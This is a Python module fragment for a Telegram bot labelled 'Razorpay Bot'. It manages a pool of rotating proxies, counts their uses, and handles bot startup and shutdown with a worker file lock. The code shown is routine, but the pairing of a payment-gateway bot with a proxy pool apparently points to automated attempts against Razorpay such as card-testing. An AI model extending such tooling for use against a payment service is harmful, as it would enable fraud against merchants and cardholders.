        all_proxies = proxy_manager.get_all_live_proxies()
        total = len(all_proxies)
        for p in all_proxies:
            status = "🟢live"
            full = p.get("full_url", p["host"])
            text += f"\n{status} `{full}` — {p.get('times_used', 0)}x used"
        text = _truncate_msg(text, total)

    else:
        return

    text += f"\n{sep}"

    try:
        await query.edit_message_text(text, reply_markup=_build_pool_keyboard(),
                                      parse_mode="Markdown")
    except Exception:
        await query.edit_message_text(text.replace("`", ""), reply_markup=_build_pool_keyboard())


# ── Bot lifecycle ────────────────────────────────────────────────────────────

async def start_bot() -> Application:
    """Initialize and start the Telegram bot.  Returns the Application.

    Call from FastAPI startup event.  Uses a POSIX file lock so that only
    ONE Gunicorn worker starts the polling loop.  Remaining workers stay
    in sender-only mode — they can still send notifications and update
    stats, but only the elected worker receives commands.
    """
    global _bot_app, _worker_task, _polling_lock_fd

    app = Application.builder().token(BOT_TOKEN).build()

    # Register command handlers
    app.add_handler(CommandHandler("start", _cmd_start))
    app.add_handler(CommandHandler("status", _cmd_status))
    app.add_handler(CommandHandler("admin", _cmd_admin))
    app.add_handler(CommandHandler("log", _cmd_log))
    app.add_handler(CommandHandler("addproxies", _cmd_addproxies))
    app.add_handler(CommandHandler("proxypool", _cmd_proxypool))
    app.add_handler(CommandHandler("proxydead", _cmd_proxydead))
    # Message handlers: proxy text + .txt file uploads (gated by is_admin check)
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, _handle_text_proxies,
    ))
    app.add_handler(MessageHandler(
        filters.Document.ALL, _handle_document,
    ))

    # Inline button handler
    app.add_handler(CallbackQueryHandler(_handle_pool_callback))

    await app.initialize()
    await app.start()

    # ONLY ONE WORKER starts the Telegram polling loop.
    # fcntl.flock with LOCK_EX | LOCK_NB is atomic — exactly one worker wins.
    try:
        lock_path = os.path.join(_DATA_DIR, "tg_polling.lock")
        _polling_lock_fd = os.open(lock_path, os.O_CREAT | os.O_RDWR, 0o666)
        fcntl.flock(_polling_lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)

        # Delete any stale webhook first — polling fails with a Conflict
        # ("can't use getUpdates while webhook is active") if one is left over.
        try:
            await app.bot.delete_webhook(drop_pending_updates=True)
        except Exception as _e:
            print(f"[tg_bot] delete_webhook warn: {_e}", file=sys.stderr)

        # We got the lock! Start listening for commands.
        await app.updater.start_polling(drop_pending_updates=True)
        print(f"[tg_bot] Worker {os.getpid()} acquired polling lock. "
              f"Bot is live.", file=sys.stderr)

        # Send a startup ping with the VPS public IP + health to the owner.
        try:
            await app.bot.send_message(
                chat_id=OWNER_ID,
                text="🔥 <b>Razorpay Bot started</b>\n" + _vps_status_text(),
                parse_mode="HTML",
            )
        except Exception as _e:
            print(f"[tg_bot] startup ping failed: {_e}", file=sys.stderr)
    except (BlockingIOError, OSError):
        # Lock denied — another worker is already polling.
        # We stay in sender-only mode: can still send notifications + stats.
        print(f"[tg_bot] Worker {os.getpid()} in Sender-Only mode.",
              file=sys.stderr)

    # Start notification worker as background task (cancelled on shutdown)
    _worker_task = asyncio.create_task(_notification_worker())

    _bot_app = app

    # Prime the stats file so this worker is visible to get_stats() immediately
    _flush_stats()

    admins = _load_admins()
    print(f"[tg_bot] started — owner={OWNER_ID}, admins={sorted(admins)}",
          file=sys.stderr)

    return app


async def stop_bot():
    """Stop the Telegram bot.  Call from FastAPI shutdown event."""
    global _bot_app, _worker_task, _polling_lock_fd
    # Cancel notification worker — prevents errors from sending on closed bot
    if _worker_task is not None:
        _worker_task.cancel()
        try:
            await _worker_task
        except asyncio.CancelledError:
            pass
        _worker_task = None
    if _bot_app is not None:
        try:
            if _bot_app.updater and _bot_app.updater.running:
                await _bot_app.updater.stop()
            await _bot_app.stop()
            await _bot_app.shutdown()
        except Exception:
            pass
        _bot_app = None
        print("[tg_bot] stopped", file=sys.stderr)
    # Release the polling lock so another worker can claim it on restart
    if _polling_lock_fd is not None:
        try:
            fcntl.flock(_polling_lock_fd, fcntl.LOCK_UN)
            os.close(_polling_lock_fd)
        except Exception:
            pass
        _polling_lock_fd = None


# ── CLI test ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    async def _test():
        app = await start_bot()
        # Keep running
        await asyncio.Event().wait()

    asyncio.run(_test())
